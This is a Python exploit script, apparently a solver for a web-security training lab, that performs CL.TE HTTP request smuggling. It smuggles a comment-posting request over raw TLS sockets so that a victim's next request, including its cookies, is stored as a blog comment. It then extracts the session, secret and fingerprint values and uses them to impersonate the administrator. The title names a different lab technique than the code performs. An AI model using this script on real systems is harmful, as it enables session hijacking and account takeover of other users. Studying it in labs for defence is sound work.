# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(s, url):
	r = s.get(url)
	if r.status_code != 200:
		r = s.get(url)
		if r.status_code != 200:
			r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def build_request(s, url, i):
	subd = url.split('://')[1]
	csrf_token = get_csrf_token(s, url + '/post?postId=3')
	session_cookie = s.cookies.get_dict().get('session')
	request_body = '0\r\n'
	request_body += '\r\n'
	request_body += 'POST /post/comment HTTP/1.1\r\n'
	request_body += 'Cookie: session=%s\r\n' % session_cookie
	request_body += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_body += 'Content-Length: ' + str(i * 100) + '\r\n'
	request_body += '\r\n'
	request_body += 'csrf=' + csrf_token + '&postId=3&name=gwyo&email=gwyo%40attacker.com&website=&comment='

	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + subd + '\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_sequence(s, url, port, i):
	subd = url.split('://')[1]
	content = build_request(s, url, i)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	if code == 'HTTP/1.1 200 OK':
		time.sleep(2)
		r = s.get(url + '/post?postId=3')
		print(r)
		if r.status_code == 200:
			code = send_smuggling(content, subd, port)
			code = send_smuggling(content, subd, port)
			time.sleep(2)
			r = s.get(url + '/post?postId=3')
			print('\t%s' % r)
			if r.status_code == 500:
				time.sleep(2)
				r = s.get(url + '/post?postId=3')
				print('\t\t%s' % r)
			res = r.text
			if re.search('; secret=(.*);', res) and re.search('; session=(.*)\r\n', res):
				fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
				secret = re.search('; secret=(.*);', res).group(1)
				session = re.search('; session=(.*)\r\n', res).group(1)
				print('[+] Found Fingerprint:\t%s' % fingerprint)
				print('[+] Found Secret:\t%s' % secret)
				print('[+] Found Session:\t%s' % session)
				return [secret, session, fingerprint]
		else:
			time.sleep(2)
			r = s.get(url + '/post?postId=3')
			print(r)
			if r.status_code == 200:
				code = send_smuggling(content, subd, port)
				code = send_smuggling(content, subd, port)
				time.sleep(2)
				r = s.get(url + '/post?postId=3')
				print('\t%s' % r)
				if r.status_code == 500:
					time.sleep(2)
					r = s.get(url + '/post?postId=3')
					print('\t\t%s' % r)
				res = r.text
				if re.search('; secret=(.*);', res) and re.search('; session=(.*)\r\n', res):
					fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
					secret = re.search('; secret=(.*);', res).group(1)
					session = re.search('; session=(.*)\r\n', res).group(1)
					print('[+] Found Fingerprint:\t%s' % fingerprint)
					print('[+] Found Secret:\t%s' % secret)
					print('[+] Found Session:\t%s' % session)
					return [secret, session, fingerprint]
			else:
				time.sleep(2)
				r = s.get(url + '/post?postId=3')
				print(r)
				if r.status_code == 200:
					code = send_smuggling(content, subd, port)
					code = send_smuggling(content, subd, port)
					time.sleep(2)
					r = s.get(url + '/post?postId=3')
					print('\t%s' % r)
					if r.status_code == 500:
						time.sleep(2)
						r = s.get(url + '/post?postId=3')
						print('\t\t%s' % r)
					res = r.text
					if re.search('; secret=(.*);', res) and re.search('; session=(.*)\r\n', res):
						fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
						secret = re.search('; secret=(.*);', res).group(1)
						session = re.search('; session=(.*)\r\n', res).group(1)
						print('[+] Found Fingerprint:\t%s' % fingerprint)
						print('[+] Found Secret:\t%s' % secret)
						print('[+] Found Session:\t%s' % session)
						return [secret, session, fingerprint]
	return False

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	resp = sock.recv(256)
	print(' '.join(resp.decode().split(None,3)[0:3]))
	resp_code = ' '.join(resp.decode().split(None,3)[0:3])
	sock.close()
	return resp_code

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		session_cookie = s.cookies.get_dict().get('session')
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			subdomain = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			url = parsed_url.scheme + '://' + subdomain
			print(parsed_url)
			print('\n[+] Trying send HTTP Request Smuggling attack...\n')
			post_path = url + '/post?postId=3'
			request_content = build_request(s, url, 5)
			for i in range(1, 13):
				print('[+] Trying to send request sequence #%s' % i)
				victim_cookies = send_sequence(s, url, port, i)
				time.sleep(1)
				if victim_cookies:
					secret = victim_cookies[0]
					session = victim_cookies[1]
					fingerprint = victim_cookies[2]
					break
			if len(secret) == len(session) == len(fingerprint):
				print('[+] Trying impersonate user with his cookies...\n')
				s.cookies.clear()
				cookies = {"victim-fingerprint": fingerprint, "session": session, "secret": secret}
				r = s.get(url + '/my-account', cookies=cookies)
				print(r)
				if 'Your username is: administrator' in r.text:
					print('[+] The lab is solved !')
			else: 
				print('\n[-] The exploit failed to retrieve User cookies <!>')
	except requests.exceptions.ProxyError:
			print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
